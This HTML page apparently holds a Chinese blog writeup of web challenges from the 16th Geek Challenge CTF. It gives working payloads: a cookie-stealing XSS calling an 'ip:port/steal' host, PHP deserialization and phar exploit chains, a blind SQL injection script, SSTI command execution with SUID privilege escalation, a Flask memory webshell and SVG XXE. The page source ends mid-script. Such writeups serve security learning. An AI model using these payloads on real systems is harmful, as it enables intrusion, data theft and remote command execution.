<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>第十六届极客大挑战 WEB Writeup | w8nn9z Blog</title>
<meta name="keywords" content="">
<meta name="description" content="第十六届极客大挑战 WEB Writeup - w8nn9z Blog">
<meta name="author" content="">
<link rel="canonical" href="https://z9nn8w.github.io/posts/ctf/geekchallenge-16th-web-writeup/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="sha256-EqVinQvl&#43;IX9lG13JX5V90An7So1FEop4tsT&#43;PYrXzU=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/ctf/geekchallenge-16th-web-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/ctf/geekchallenge-16th-web-writeup/">
  <meta property="og:site_name" content="w8nn9z Blog">
  <meta property="og:title" content="第十六届极客大挑战 WEB Writeup">
  <meta property="og:locale" content="zh-cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-11-05T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-11-23T00:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="第十六届极客大挑战 WEB Writeup">
<meta name="twitter:description" content="">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://z9nn8w.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CTF",
      "item": "https://z9nn8w.github.io/posts/ctf/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "第十六届极客大挑战 WEB Writeup",
      "item": "https://z9nn8w.github.io/posts/ctf/geekchallenge-16th-web-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "第十六届极客大挑战 WEB Writeup",
  "name": "第十六届极客大挑战 WEB Writeup",
  "description": "",
  "keywords": [
    
  ],
  "articleBody": "阿基里斯追乌龟 抓包修改 achilles_distanc ，改为和 tortoise_distanc 一样大：\nflag：\nVibe SEO 获取站点地图 sitemap.xml：\nhttp://localhost/ weekly http://localhost/aa__^^.php never 访问 aa__^^.php，根据报错判断是个任意文件读取：\nWarning: Undefined array key \"filename\" in /var/www/html/aa__^^.php on line 3 文件名最长为10，正好读取 aa__^^.php：\n\u003c?php $flag = fopen('/my_secret.txt', 'r'); if (strlen($_GET['filename']) \u003c 11) { readfile($_GET['filename']); } else { echo \"Filename too long\"; } 一开始用伪协议 php://fd 无法读取到flag，猜测是分配的fd比较大，改用 /dev/fd 来爆破 0~99，在 /dev/fd/13 读取到flag内容：\nXross The Finish Line 过滤了空格，单双引号，script，error，img\nxss窃取cookie：\n\u003csvg/onload=fetch(`http://ip:port/steal?c=${document.cookie}`)\u003e Expression 爆破出jwt密钥：secret，伪造jwt：\n猜测有ejs模板渲染：\npopself index.php：\n\u003c?php show_source(__FILE__); error_reporting(0); class All_in_one { public $KiraKiraAyu; public $_4ak5ra; public $K4per; public $Samsāra; public $komiko; public $Fox; public $Eureka; public $QYQS; public $sleep3r; public $ivory; public $L; public function __set($name, $value){ echo \"他还是没有忘记那个\".$value.\"\n\"; echo \"收集夏日的碎片吧\n\"; $fox = $this-\u003eFox; if ( !($fox instanceof All_in_one) \u0026\u0026 $fox()===\"summer\"){ echo \"QYQS enjoy summer\n\"; echo \"开启循环吧\n\"; $komiko = $this-\u003ekomiko; $komiko-\u003eEureka($this-\u003eL, $this-\u003esleep3r); } } public function __invoke(){ echo \"恭喜成功signin!\n\"; echo \"welcome to Geek_Challenge2025!\n\"; $f = $this-\u003eSamsāra; $arg = $this-\u003eivory; $f($arg); } public function __destruct(){ echo \"你能让K4per和KiraKiraAyu组成一队吗\n\"; if (is_string($this-\u003eKiraKiraAyu) \u0026\u0026 is_string($this-\u003eK4per)) { if (md5(md5($this-\u003eKiraKiraAyu))===md5($this-\u003eK4per)){ die(\"boys和而不同\n\"); } if(md5(md5($this-\u003eKiraKiraAyu))==md5($this-\u003eK4per)){ echo \"BOY♂ sign GEEK\n\"; echo \"开启循环吧\n\"; $this-\u003eQYQS-\u003epartner = \"summer\"; } else { echo \"BOY♂ can`t sign GEEK\n\"; echo md5(md5($this-\u003eKiraKiraAyu)).\"\n\"; echo md5($this-\u003eK4per).\"\n\"; } } else{ die(\"boys堂堂正正\"); } } public function __tostring(){ echo \"再走一步...\n\"; $a = $this-\u003e_4ak5ra; $a(); } public function __call($method, $args){ if (strlen($args[0])\u003c4 \u0026\u0026 ($args[0]+1)\u003e10000){ echo \"再走一步\n\"; echo $args[1]; } else{ echo \"你要努力进窄门\n\"; } } } class summer { public static function find_myself(){ return \"summer\"; } } $payload = $_GET[\"24_SYC.zip\"]; if (isset($payload)) { unserialize($payload); } else { echo \"没有大家的压缩包的话，瓦达西！\n\"; } ?\u003e 注意md5那部分需要最后0e后的都是数字才能绕过，否则仍被当作字符串比较无法绕过，还有后续科学计数法绕过时需要是字符串类型，否则长度会是数值的长度导致无法绕过strlen\n__destruct() -\u003e __set() -\u003e __call() -\u003e __tostring() -\u003e __invoke()，exp：\n\u003c?php class All_in_one { public $KiraKiraAyu; public $_4ak5ra; public $K4per; public $Samsāra; public $komiko; public $Fox; public $Eureka; public $QYQS; public $sleep3r; public $ivory; public $L; } class summer { public static function find_myself(){ return \"summer\"; } } // __invoke $obj1 = new All_in_one(); $obj1-\u003eSamsāra = \"system\"; $obj1-\u003eivory = \"env\"; // __toString $obj2 = new All_in_one(); $obj2-\u003e_4ak5ra = $obj1; // __set+__call $obj3 = new All_in_one(); $obj3-\u003eFox = \"summer::find_myself\"; $obj3-\u003ekomiko = $obj2; $obj3-\u003eEureka = \"nonexistence\"; $obj3-\u003eL = \"1e5\";\t// $args[0] $obj3-\u003esleep3r = $obj2; // $args[1] $obj4 = new All_in_one(); $obj4-\u003eKiraKiraAyu = \"iv2Cn\"; // f2WfQ $obj4-\u003eK4per = \"240610708\"; $obj4-\u003eQYQS = $obj3; echo urlencode(serialize($obj4)); ?\u003e payload：\n?24[SYC.zip=O%3A10%3A%22All_in_one%22%3A11%3A%7Bs%3A11%3A%22KiraKiraAyu%22%3Bs%3A5%3A%22iv2Cn%22%3Bs%3A7%3A%22_4ak5ra%22%3BN%3Bs%3A5%3A%22K4per%22%3Bs%3A9%3A%22240610708%22%3Bs%3A8%3A%22Sams%C4%81ra%22%3BN%3Bs%3A6%3A%22komiko%22%3BN%3Bs%3A3%3A%22Fox%22%3BN%3Bs%3A6%3A%22Eureka%22%3BN%3Bs%3A4%3A%22QYQS%22%3BO%3A10%3A%22All_in_one%22%3A11%3A%7Bs%3A11%3A%22KiraKiraAyu%22%3BN%3Bs%3A7%3A%22_4ak5ra%22%3BN%3Bs%3A5%3A%22K4per%22%3BN%3Bs%3A8%3A%22Sams%C4%81ra%22%3BN%3Bs%3A6%3A%22komiko%22%3BO%3A10%3A%22All_in_one%22%3A11%3A%7Bs%3A11%3A%22KiraKiraAyu%22%3BN%3Bs%3A7%3A%22_4ak5ra%22%3BO%3A10%3A%22All_in_one%22%3A11%3A%7Bs%3A11%3A%22KiraKiraAyu%22%3BN%3Bs%3A7%3A%22_4ak5ra%22%3BN%3Bs%3A5%3A%22K4per%22%3BN%3Bs%3A8%3A%22Sams%C4%81ra%22%3Bs%3A6%3A%22system%22%3Bs%3A6%3A%22komiko%22%3BN%3Bs%3A3%3A%22Fox%22%3BN%3Bs%3A6%3A%22Eureka%22%3BN%3Bs%3A4%3A%22QYQS%22%3BN%3Bs%3A7%3A%22sleep3r%22%3BN%3Bs%3A5%3A%22ivory%22%3Bs%3A3%3A%22env%22%3Bs%3A1%3A%22L%22%3BN%3B%7Ds%3A5%3A%22K4per%22%3BN%3Bs%3A8%3A%22Sams%C4%81ra%22%3BN%3Bs%3A6%3A%22komiko%22%3BN%3Bs%3A3%3A%22Fox%22%3BN%3Bs%3A6%3A%22Eureka%22%3BN%3Bs%3A4%3A%22QYQS%22%3BN%3Bs%3A7%3A%22sleep3r%22%3BN%3Bs%3A5%3A%22ivory%22%3BN%3Bs%3A1%3A%22L%22%3BN%3B%7Ds%3A3%3A%22Fox%22%3Bs%3A19%3A%22summer%3A%3Afind_myself%22%3Bs%3A6%3A%22Eureka%22%3Bs%3A12%3A%22nonexistence%22%3Bs%3A4%3A%22QYQS%22%3BN%3Bs%3A7%3A%22sleep3r%22%3Br%3A14%3Bs%3A5%3A%22ivory%22%3BN%3Bs%3A1%3A%22L%22%3Bs%3A3%3A%221e5%22%3B%7Ds%3A7%3A%22sleep3r%22%3BN%3Bs%3A5%3A%22ivory%22%3BN%3Bs%3A1%3A%22L%22%3BN%3B%7D one last image PNG头 + 短标签 绕过waf:\nflag在环境变量里：\nSequal No Uta 单引号闭合：\n过滤了空格，注释符绕过：\n布尔盲注，先查 sqite_lmaster 表里的创建语句：\ndef sql(): target = \"http://019a6318-c732-7f8b-8582-ffeba4a20572.geek.ctfplus.cn/check.php\" sql = \"\" for i in range(1,250): for char in string.whitespace + \"\\n~!@#$%^\u0026*()_+-=\" + string.ascii_uppercase + string.ascii_lowercase + string.digits: payload = f\"admin'/**/and/**/substr((select/**/group_concat(sql)/**/from/**/sqlite_master),{i},1)='{char}';\" params = {\"name\": payload} resp = requests.get(url=target, params=params) if \"该用户存在且活跃\" in resp.text: sql += char print(f\"Found: {sql}\") break return sql users 表创建语句：\nCREATE TABLE users( id INTEGER PRIMARYKEY AUTO INCREMENT username TEXT UNIQUE NOT NULL password TEXT UNIQUE NOT NULL is_active INTEGER NOT NULL DEFAULT 1 secret TEXT ) 查secret字段，字段里的值就是flag：\ndef secret(): target = \"http://019a6318-c732-7f8b-8582-ffeba4a20572.geek.ctfplus.cn/check.php\" secret = \"\" for i in range(1,50): for char in string.whitespace + \"}{\\n~!@#$%^\u0026*()_+-=\" + string.ascii_uppercase + string.ascii_lowercase + string.digits: payload = f\"admin'/**/and/**/substr((select/**/group_concat(secret)/**/from/**/users),{i},1)='{char}';\" params = {\"name\": payload} resp = requests.get(url=target, params=params) if \"该用户存在且活跃\" in resp.text: secret += char print(f\"Found: {secret}\") break return secret ez_read 读取故事页面存在任意文件读取，测试一下就知道有个../的替换，读取 ....//app.py：\nfrom flask import Flask, request, render_template, render_template_string, redirect, url_for, session import os app = Flask(__name__, template_folder=\"templates\", static_folder=\"static\") app.secret_key = \"key_ciallo_secret\" USERS = {} def waf(payload: str) -\u003e str: print(len(payload)) if not payload: return \"\" if len(payload) not in (114, 514): return payload.replace(\"(\", \"\") else: waf = [\"__class__\", \"__base__\", \"__subclasses__\", \"__globals__\", \"import\",\"self\",\"session\",\"blueprints\",\"get_debug_flag\",\"json\",\"get_template_attribute\",\"render_template\",\"render_template_string\",\"abort\",\"redirect\",\"make_response\",\"Response\",\"stream_with_context\",\"flash\",\"escape\",\"Markup\",\"MarkupSafe\",\"tojson\",\"datetime\",\"cycler\",\"joiner\",\"namespace\",\"lipsum\"] for w in waf: if w in payload: raise ValueError(f\"waf\") return payload @app.route(\"/\") def index(): user = session.get(\"user\") return render_template(\"index.html\", user=user) @app.route(\"/register\", methods=[\"GET\", \"POST\"]) def register(): if request.method == \"POST\": username = (request.form.get(\"username\") or \"\") password = request.form.get(\"password\") or \"\" if not username or not password: return render_template(\"register.html\", error=\"用户名和密码不能为空\") if username in USERS: return render_template(\"register.html\", error=\"用户名已存在\") USERS[username] = {\"password\": password} session[\"user\"] = username return redirect(url_for(\"profile\")) return render_template(\"register.html\") @app.route(\"/login\", methods=[\"GET\", \"POST\"]) def login(): if request.method == \"POST\": username = (request.form.get(\"username\") or \"\").strip() password = request.form.get(\"password\") or \"\" user = USERS.get(username) if not user or user.get(\"password\") != password: return render_template(\"login.html\", error=\"用户名或密码错误\") session[\"user\"] = username return redirect(url_for(\"profile\")) return render_template(\"login.html\") @app.route(\"/logout\") def logout(): session.clear() return redirect(url_for(\"index\")) @app.route(\"/profile\") def profile(): user = session.get(\"user\") if not user: return redirect(url_for(\"login\")) name_raw = request.args.get(\"name\", user) try: filtered = waf(name_raw) tmpl = f\"欢迎，{filtered}\" rendered_snippet = render_template_string(tmpl) error_msg = None except Exception as e: rendered_snippet = \"\" error_msg = f\"渲染错误: {e}\" return render_template( \"profile.html\", content=rendered_snippet, name_input=name_raw, user=user, error_msg=error_msg, ) @app.route(\"/read\", methods=[\"GET\", \"POST\"]) def read_file(): user = session.get(\"user\") if not user: return redirect(url_for(\"login\")) base_dir = os.path.join(os.path.dirname(__file__), \"story\") try: entries = sorted([f for f in os.listdir(base_dir) if os.path.isfile(os.path.join(base_dir, f))]) except FileNotFoundError: entries = [] filename = \"\" if request.method == \"POST\": filename = request.form.get(\"filename\") or \"\" else: filename = request.args.get(\"filename\") or \"\" content = None error = None if filename: sanitized = filename.replace(\"../\", \"\") target_path = os.path.join(base_dir, sanitized) if not os.path.isfile(target_path): error = f\"文件不存在: {sanitized}\" else: with open(target_path, \"r\", encoding=\"utf-8\", errors=\"ignore\") as f: content = f.read() return render_template(\"read.html\", files=entries, content=content, filename=filename, error=error, user=user) if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=8080, debug=False) /profile 路由下存在 ssti，构造114长度的payload，否则无法处理过滤括号\n利用config缩短payload长度，flag需要root权限读取，查找suid权限文件：\n{{config['__cl'+'ass__'].__init__['__glo'+'bals__']['os'].popen('find / -perm -u=s -type f 2\u003e/dev/null').read() }}\r/usr/bin/su\r/usr/bin/gpasswd\r/usr/bin/chfn\r/usr/bin/chsh\r/usr/bin/umount\r/usr/bin/newgrp\r/usr/bin/passwd\r/usr/bin/mount\r/usr/local/bin/env 查看env：\n{{config['__cl'+'ass__'].__init__['__glo'+'bals__']['os'].popen('env').read() }}\rHINT=用我提个权吧 env后直接跟命令实现suid提权：\n{{config['__cl'+'ass__'].__init__['__glo'+'bals__']['os'].popen('env cat /flag').read() }} 百年继承 正常流程：\n上校已创建。\r上校继承于他的父亲,他的父亲继承于人类\r时间流逝：卷入武装起义：命运与战争交织。\r时间流逝：抉择时刻：上校需要做出选择（武器与策略）。\r事件：上校使用 spear，采取 ambush 策略。世界线变动...\r(上校的weapon属性被赋值为spear,tactic属性被赋值为ambush)\r时间流逝：宿命延续：行军与退却。\r时间流逝：面对行刑队：命运的审判即将到来。\r行刑队：开始执行判决。\r行刑队也继承于人类\r临死之前,上校目光瞄着行刑队的佩剑,上面分明写着：\rlambda executor, target: (target.__del__(), setattr(target, 'alive', False), '处决成功')\r这是人类自古以来就拥有的execute_method属性...\r处决成功\r时间流逝：结局：命运如沙漏般倾泻…… 上校继承于父亲，父亲继承于人类，自定义的 weapon 和 tactic 都是上校的属性，行刑队同样继承于人类，最后行刑执行的是人类的 execute_method 属性，页面回显是第三个操作结果\npython 原型链污染，目标是将人类的 execute_method 第三个操作部分设置为命令执行结果\n{ \"weapon\": \"spear\", \"tactic\": \"ambush\", \"__class__\": { \"__base__\": { \"__base__\": { \"execute_method\": \"lambda executor, target: (target.__del__(), setattr(target, 'alive', False), __import__('os').popen('env').read())\" } } } } ez-seralize index.php：\n\u003c?php ini_set('display_errors', '0'); $filename = isset($_GET['filename']) ? $_GET['filename'] : null; $content = null; $error = null; if (isset($filename) \u0026\u0026 $filename !== '') { $balcklist = [\"../\",\"%2e\",\"..\",\"data://\",\"\\n\",\"input\",\"%0a\",\"%\",\"\\r\",\"%0d\",\"php://\",\"/etc/passwd\",\"/proc/self/environ\",\"php:file\",\"filter\"]; foreach ($balcklist as $v) { if (strpos($filename, $v) !== false) { $error = \"no no no\"; break; } } if ($error === null) { if (isset($_GET['serialized'])) { require 'function.php'; $file_contents= file_get_contents($filename); if ($file_contents === false) { $error = \"Failed to read seraizlie file or file does not exist: \" . htmlspecialchars($filename); } else { $content = $file_contents; } } else { $file_contents = file_get_contents($filename); if ($file_contents === false) { $error = \"Failed to read file or file does not exist: \" . htmlspecialchars($filename); } else { $content = $file_contents; } } } } else { $error = null; } ?\u003e \u003c?php if ($error !== null \u0026\u0026 $error !== ''): ?\u003e \u003c?php echo htmlspecialchars($error, ENT_QUOTES); ?\u003e \u003c?php endif; ?\u003e \u003c?php if ($content !== null): ?\u003e 文件：\u003c?php echo htmlspecialchars($filename, ENT_QUOTES); ?\u003e \u003c?php echo strlen($content); ?\u003e bytes \u003c?php echo htmlspecialchars($content, ENT_QUOTES); ?\u003e \u003c?php elseif ($error === null \u0026\u0026 isset($_GET['filename'])): ?\u003e 未能读取内容或文件为空。 \u003c?php endif; ?\u003e function.php：\n\u003c?php class A { public $file; public $luo; public function __construct() { } public function __toString() { $function = $this-\u003eluo; return $function(); } } class B { public $a; public $test; public function __construct() { } public function __wakeup() { echo($this-\u003etest); } public function __invoke() { $this-\u003ea-\u003erce_me(); } } class C { public $b; public function __construct($b = null) { $this-\u003eb = $b; } public function rce_me() { echo \"Success!\\n\"; system(\"cat /flag/flag.txt \u003e /tmp/flag\"); } } 想找文件上传点，robots.txt：\nUser-agent: * Disallow: /var/www/html/uploads.php uploads.php：\n\u003c?php $uploadDir = __DIR__ . '/uploads/'; if (!is_dir($uploadDir)) { mkdir($uploadDir, 0755, true); } $whitelist = ['txt', 'log', 'jpg', 'jpeg', 'png', 'zip','gif','gz']; $allowedMimes = [ 'txt' =\u003e ['text/plain'], 'log' =\u003e ['text/plain'], 'jpg' =\u003e ['image/jpeg'], 'jpeg' =\u003e ['image/jpeg'], 'png' =\u003e ['image/png'], 'zip' =\u003e ['application/zip', 'application/x-zip-compressed', 'multipart/x-zip'], 'gif' =\u003e ['image/gif'], 'gz' =\u003e ['application/gzip', 'application/x-gzip'] ]; $resultMessage = ''; if ($_SERVER['REQUEST_METHOD'] === 'POST' \u0026\u0026 isset($_FILES['file'])) { $file = $_FILES['file']; if ($file['error'] === UPLOAD_ERR_OK) { $originalName = $file['name']; $ext = strtolower(pathinfo($originalName, PATHINFO_EXTENSION)); if (!in_array($ext, $whitelist, true)) { die('File extension not allowed.'); } $mime = $file['type']; if (!isset($allowedMimes[$ext]) || !in_array($mime, $allowedMimes[$ext], true)) { die('MIME type mismatch or not allowed. Detected: ' . htmlspecialchars($mime)); } $safeBaseName = preg_replace('/[^A-Za-z0-9_\\-\\.]/', '_', basename($originalName)); $safeBaseName = ltrim($safeBaseName, '.'); $targetFilename = time() . '_' . $safeBaseName; file_put_contents('/tmp/log.txt', \"upload file success: $targetFilename, MIME: $mime\\n\"); $targetPath = $uploadDir . $targetFilename; if (move_uploaded_file($file['tmp_name'], $targetPath)) { @chmod($targetPath, 0644); $resultMessage = ' File uploaded successfully '. ''; } else { $resultMessage = ' Failed to move uploaded file.'; } } else { $resultMessage = ' Upload error: ' . $file['error'] . ''; } } ?\u003e B.__wakeup() -\u003e A.__toString() -\u003e B.__invoke()，应该是要利用phar伪协议进行反序列化，exp：\n\u003c?php class A { public $file; public $luo; } class B { public $a; public $test; } class C { public $b; } $obj1 = new C(); $obj2 = new B(); $obj2-\u003ea = $obj1; $obj3 = new A(); $obj3-\u003eluo = $obj2; $obj4 = new B(); $obj4-\u003etest = $obj3; @unlink(\"phar.phar\"); $phar = new Phar('phar.phar'); $phar -\u003e stopBuffering(); $phar -\u003e setStub('GIF89a'.'\u003c?php __HALT_COMPILER();?\u003e'); $phar -\u003e addFromString('test.txt','test'); $phar -\u003e setMetadata($obj4); $phar -\u003e stopBuffering(); ?\u003e 修改phar后缀名为jpg，上传文件后读取 /tmp/log.txt：\nupload file success: 1762752974_phar.jpg, MIME: image/jpeg 根据 index.php 中关于 open_basedir 的信息：\n可以直接访问上传的目录，后续直接phar反序列化上传文件即可，注意添加 serialized 参数用于包含 function.php：\n最后读取 /tmp/flag 获取flag\neeeeezzzzzzZip phar include RCE，将 phar 打包成 gz等压缩文件被 include 同样会执行stub中的php代码，exp：\n\u003c?php $phar = new Phar('exploit.phar'); $phar-\u003estartBuffering(); $stub = \u003c\u003c\u003c'STUB' \u003c?php system('cat /flag/flag.txt'); __HALT_COMPILER(); ?\u003e STUB; $phar-\u003esetStub($stub); $phar-\u003eaddFromString('test.txt', 'test'); $phar-\u003estopBuffering(); ?\u003e 路在脚下 初步测试，ban了 before_request after_request error，由于网页无执行结果回显考虑打内存马创建路由\n向 url_map 中新增一条 urlrule 创建 /shell 路由，payload1：\n{{url_for.__globals__['__builtins__']['eval'](\"app.url_map.add(app.url_rule_class('/shell',methods=['GET'],endpoint='shell'))\",{'app':url_for.__globals__['current_app']})}} 向 view_function 中添加对应 endpoint 的实现\n{{url_for.__globals__['__builtins__']['eval'](\"app.view_functions.update({'shell':lambda:__import__('os').popen(app.request_context.__globals__['request_ctx'].request.args.get('cmd','whoami')).read()})\",{'app':url_for.__globals__['current_app']})}} 访问 /shell，页面显示 root 表明路由创建成功，传参cmd实现rce\nImage Viewer 允许上传的文件类型：\n\u003cinput type=\"file\" name=\"file\" accept=\".svg,image/svg+xml,.png,.jpg,.jpeg,.gif,image/*\" /\u003e svg XXE：\n\u003c?xml version=\"1.0\" standalone=\"yes\"?\u003e \u003c!DOCTYPE test [ \u003c!ENTITY xxe SYSTEM \"file:///flag\" \u003e ]\u003e ",
  "wordCount" : "5336",
  "inLanguage": "en",
  "datePublished": "2025-11-05T00:00:00Z",
  "dateModified": "2025-11-23T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://z9nn8w.github.io/posts/ctf/geekchallenge-16th-web-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "w8nn9z Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://z9nn8w.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/posts" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/archives" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/about" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      第十六届极客大挑战 WEB Writeup
    </h1>
    <div class="post-meta"><span title='2025-11-05 00:00:00 +0000 UTC'>November 5, 2025</span>

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details >
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e9%98%bf%e5%9f%ba%e9%87%8c%e6%96%af%e8%bf%bd%e4%b9%8c%e9%be%9f" aria-label="阿基里斯追乌龟">阿基里斯追乌龟</a></li>
                    <li>
                        <a href="#vibe-seo" aria-label="Vibe SEO">Vibe SEO</a></li>
                    <li>
                        <a href="#xross-the-finish-line" aria-label="Xross The Finish Line">Xross The Finish Line</a></li>
                    <li>
                        <a href="#expression" aria-label="Expression">Expression</a></li>
                    <li>
                        <a href="#popself" aria-label="popself">popself</a></li>
                    <li>
                        <a href="#one-last-image" aria-label="one last image">one last image</a></li>
                    <li>
                        <a href="#sequal-no-uta" aria-label="Sequal No Uta">Sequal No Uta</a></li>
                    <li>
                        <a href="#ez_read" aria-label="ez_read">ez_read</a></li>
                    <li>
                        <a href="#%e7%99%be%e5%b9%b4%e7%bb%a7%e6%89%bf" aria-label="百年继承">百年继承</a></li>
                    <li>
                        <a href="#ez-seralize" aria-label="ez-seralize">ez-seralize</a></li>
                    <li>
                        <a href="#eeeeezzzzzzzip" aria-label="eeeeezzzzzzZip">eeeeezzzzzzZip</a></li>
                    <li>
                        <a href="#%e8%b7%af%e5%9c%a8%e8%84%9a%e4%b8%8b" aria-label="路在脚下">路在脚下</a></li>
                    <li>
                        <a href="#image-viewer" aria-label="Image Viewer">Image Viewer</a></li>
                    <li>
                        <a href="#pdf-viewer" aria-label="PDF Viewer">PDF Viewer</a></li>
                    <li>
                        <a href="#%e8%b7%af%e5%9c%a8%e8%84%9a%e4%b8%8b_revenge" aria-label="路在脚下_revenge">路在脚下_revenge</a></li>
                    <li>
                        <a href="#xross-the-doom" aria-label="Xross The Doom">Xross The Doom</a></li>
                    <li>
                        <a href="#77777-time-task" aria-label="77777 time task">77777 time task</a></li>
                    <li>
                        <a href="#ezjdbc" aria-label="ezjdbc">ezjdbc</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
